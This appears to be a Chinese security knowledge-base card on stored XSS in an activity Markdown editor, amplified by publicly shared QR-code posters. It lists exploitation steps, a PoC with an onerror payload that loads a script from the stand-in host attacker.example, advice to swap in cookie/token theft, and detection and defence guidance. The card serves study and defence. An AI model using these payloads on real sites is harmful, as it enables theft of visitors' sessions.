---
id: web-generic-xss-share-qrcode-markdown-stored
title: 打卡活动 Markdown 编辑器存储型 XSS：借分享二维码公开海报让任意扫码者触发
type: scenario
domain: web
path: web/generic/xss
technique: stored-xss-share-channel-amplification
tags:
- xss
- stored-xss
- markdown
- richtext
- qr-code
- share-link
- web
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V514
  verified_at: '2026-11-11T11:43:56+08:00'
  notes: 已对照原文与全部19张截图（15-19）：活动名称显示为实体编码、活动介绍正文在编辑页与公开页裸渲染、保存请求为 /…/activity/save（原文前缀打码）、分享海报含二维码且扫码后手机页弹窗，均与卡片一致。已将示例接口路径标注为原文打码前缀，避免把 /api 当既定事实。dedup 报告 duplicate 为同 id 同文自匹配，非真实重复；与 markdown-viewer-lfi、iframe-javascript 绕过等卡不同链。原文无产品名/版本，不设 affected_versions。
url: /docs/web/generic/xss/web-generic-xss-share-qrcode-markdown-stored/
draft: false
kb_aliases:
- 分享二维码 XSS
- 活动介绍存储型 XSS
- Markdown 编辑器存储型 XSS
- 海报二维码 XSS
---

## 一句话结论

面向用户的活动/内容编辑器若允许在正文（Markdown 或富文本）中插入 HTML 且保存接口对 content 不做净化，单看只是「编辑器里弹自己」的 self-XSS；但业务同时提供「分享海报/二维码」把该页面公开分发时，payload 随活动公开，任何扫码访问活动详情页的人都会触发存储型 XSS，触达面从创建者自己放大到任意访客。

## 原理

- **编辑器允许 HTML 进入 content**：活动介绍使用 Markdown/富文本编辑器，源码模式或粘贴可直接写入 `<img src=x onerror=...>`、`<h1>` 等 HTML；保存接口（原文截图前缀打码，仅可见 `…/activity/save`）的 `content` 字段原样落库，服务端未做 HTML 白名单净化。
- **名称字段安全、正文裸渲染的对比**：活动名称提交 `<h1>111` 后页面显示 `&lt;h1&gt;111`（输出时做了 HTML 实体编码），说明该字段有编码；而活动介绍正文在编辑页与公开详情页被按 HTML 渲染，`<img/src/onerror=alert(1)>` 直接弹窗。这一差异可用于快速定位哪条渲染路径没有防护。
- **分享功能把私有内容变成公开投递渠道**：活动创建后可生成分享海报，海报上带二维码，扫码打开的就是公开活动详情页；该页对未登录、任意扫码者渲染同一 content，于是存储型 XSS 从「只有编辑者能看到编辑页」变成「所有扫码者都会触发」。
- **为什么成立**：XSS 的最终危害取决于 payload 在谁的浏览器、什么权限下执行；分享页把内容的可见范围交给了任意访客，而渲染又未净化，两者叠加即完成危害放大。

## 触发条件

- 目标业务允许普通用户创建富文本/Markdown 内容，且提供公开分享渠道（海报二维码、公开链接、站内推送、邮件通知等）。
- 保存接口对 content 不做 HTML 白名单净化；公开详情页以 HTML 渲染正文。
- 分享页可被任意用户（含未登录）访问，或分享给管理员/客服等更高权限用户查看。
- 内容渲染无 CSP、无沙箱 iframe 等隔离手段。

## 利用步骤

1. 在活动介绍编辑器中插入探测 payload：先 `<h1>111` 看是否被解析，再 `<img/src/onerror=alert(1)>`。
2. 保存并抓包（如 `POST /…/activity/save`，原文截图前缀打码），确认 `content` 字段里的 payload 未被过滤/转义，原样落库。
3. 打开活动编辑页/预览页确认弹窗，验证渲染路径；同时观察活动名称等其它字段是否被实体编码，确认只有正文裸渲染。
4. 生成活动分享海报/二维码（或取公开链接），用无痕/未登录环境扫码打开活动详情页，确认 payload 在公开页同样执行。
5. 把海报/二维码链接投递给目标用户（或诱导其扫描），实战将 `alert` 换成读取 cookie/token、页面内容并外带。

## PoC

```html
<!-- 活动介绍正文（Markdown 源码模式 / 富文本源码模式） -->
<img/src/onerror=alert(1)>

<!-- 执行任意 JS：动态插入外链脚本，便于加载完整利用代码 -->
<img src=x onerror="s=createElement('script');body.appendChild(s);s.src='//attacker.example/x.js'">
```

```http
# 原文截图仅可见 …/activity/save，/api 为示例前缀
POST /api/activity/save HTTP/1.1
Content-Type: application/json
Cookie: session=...

{"id":1135,"title":"活动标题","content":"<h1>1111</h1><p><br></p><p><img/src/onerror=alert(1)></p>"}
```

```text
保存成功后生成分享海报/二维码 → 任意扫码者打开活动详情页即执行 content 中的 img onerror。
```

## 变体与关联

- 变体：分享渠道不限于二维码——公开链接、海报、站内消息、邮件/短信通知都等价；凡是「用户可创建内容 → 平台公开分发」的富文本功能（活动、公告、个人主页、问答、评论精选）都能用该思路放大。
- 变体：若保存接口同时缺 CSRF 防护，可先用 CSRF 把 payload 写进受害者自己的活动再分享，组合出 1-click 链。
- 关联：[[web-generic-xss-ai-chat-output-prompt-injection]]（同为「分享页放大存储型 XSS」的思路，场景是 AI 聊天会话分享）、[[web-generic-xss-self-xss-csrf-auto-create]]（另一种 self-XSS 触达放大手法：CSRF 自动创建资源）。
- 边界：公开页有 CSP（`script-src 'self'` 且无 JSONP/同源 JS 上传）、内容经过服务端 sanitize、或渲染在沙箱 iframe 中时不成立。

## 检测与防御

- 修复：服务端对富文本/Markdown 的 HTML 输出做白名单净化（事件属性、`javascript:` 协议、`<script>` 等一律移除），编辑页与公开页使用同一套净化。
- 修复：公开渲染页加严格 CSP（`script-src 'self'`，禁 inline）并把用户内容放入沙箱 iframe/独立域。
- 加固：分享前对内容做二次扫描（含外链 script、onerror、onload 等特征）；高权限页面（客服后台）若要渲染用户内容，强制净化并使用隔离域。
- 检测：保存接口请求体中 content 含 `onerror=`、`onload=`、`<script`、外链 `src=` 等特征；公开页出现指向外部域的可疑脚本加载。
